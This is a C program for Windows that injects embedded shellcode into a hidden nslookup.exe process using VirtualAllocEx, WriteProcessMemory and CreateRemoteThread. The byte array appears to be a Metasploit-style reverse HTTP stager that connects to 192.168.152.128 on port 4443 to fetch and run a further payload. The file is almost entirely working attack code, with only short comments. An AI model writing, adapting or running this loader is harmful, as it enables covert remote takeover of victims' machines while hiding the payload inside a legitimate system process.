#include<windows.h>	
#include<stdio.h>
int main()
{
	//size of buf is 744 and we will allocate slightly high memory i.e 750
	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
		"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
		"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x4d"
		"\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9"
		"\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
		"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
		"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
		"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e\x69"
		"\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
		"\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31\xc0\x4d\x31"
		"\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5"
		"\xe8\x10\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x35"
		"\x32\x2e\x31\x32\x38\x00\x5a\x48\x89\xc1\x49\xc7\xc0\x5b\x11"
		"\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f"
		"\xc6\x00\x00\x00\x00\xff\xd5\xe8\xbc\x00\x00\x00\x2f\x42\x6e"
		"\x62\x41\x64\x76\x67\x72\x30\x55\x62\x70\x53\x4f\x68\x4b\x69"
		"\x57\x50\x4a\x6d\x41\x4f\x77\x6b\x31\x76\x52\x30\x6a\x48\x78"
		"\x55\x6f\x59\x6d\x67\x33\x55\x48\x66\x6c\x55\x34\x69\x63\x77"
		"\x74\x42\x4d\x6c\x39\x76\x48\x33\x53\x33\x44\x78\x6e\x4f\x30"
		"\x79\x62\x47\x6e\x69\x50\x45\x35\x54\x42\x33\x38\x37\x51\x55"
		"\x69\x6b\x62\x4f\x30\x4c\x5f\x6a\x48\x41\x59\x6a\x30\x68\x51"
		"\x6c\x43\x32\x45\x64\x69\x38\x65\x66\x4b\x4a\x78\x79\x30\x42"
		"\x58\x69\x4e\x2d\x34\x72\x39\x66\x32\x52\x6a\x45\x64\x6f\x78"
		"\x63\x62\x68\x69\x36\x61\x70\x58\x79\x57\x4b\x79\x66\x56\x49"
		"\x6d\x75\x48\x6c\x32\x34\x62\x6a\x64\x48\x44\x5f\x59\x31\x35"
		"\x44\x31\x4d\x54\x32\x49\x50\x5f\x65\x74\x74\x44\x75\x70\x6d"
		"\x58\x7a\x6d\x36\x70\x65\x52\x4f\x77\x55\x4a\x77\x30\x46\x79"
		"\x34\x6c\x66\x76\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9"
		"\x53\x48\xb8\x00\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49"
		"\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48"
		"\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a"
		"\x04\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5"
		"\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9\x53"
		"\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1f\x48"
		"\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00"
		"\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00\x00\x00"
		"\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0\x00"
		"\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5"
		"\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7"
		"\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12\x96\x89\xe2\x00"
		"\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b"
		"\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\x49"
		"\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";

		

		//We will first create a process to attach our shell code
		//In this code we are running nslookup command and creating a process
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		LPCWSTR cmd;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));
		si.cb = sizeof(si);
		cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");

		if (!CreateProcess(
			cmd,							// Executable
			NULL,							// Command line
			NULL,							// Process handle not inheritable
			NULL,							// Thread handle not inheritable
			FALSE,							// Set handle inheritance to FALSE
			CREATE_NO_WINDOW,	            // Do Not Open a Window
			NULL,							// Use parent's environment block
			NULL,							// Use parent's starting directory 
			&si,			                // Pointer to STARTUPINFO structure
			&pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
		))
		{
			printf("Process could not be created\n");
			return 0;
		}

		printf("Nslook process is created\n");

		LPVOID base_address = NULL;
		printf("Memory has been allocated\n");
		base_address = VirtualAllocEx(pi.hProcess,NULL,750, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		printf("Moving shellcode into memory...\n");
		WriteProcessMemory(pi.hProcess, base_address, buf, 750, NULL);
		//memcpy(base_address, buf, 750);
		HANDLE remoteThread=NULL;
		remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)base_address, NULL, 0, NULL);

		CloseHandle(pi.hProcess);

}
	
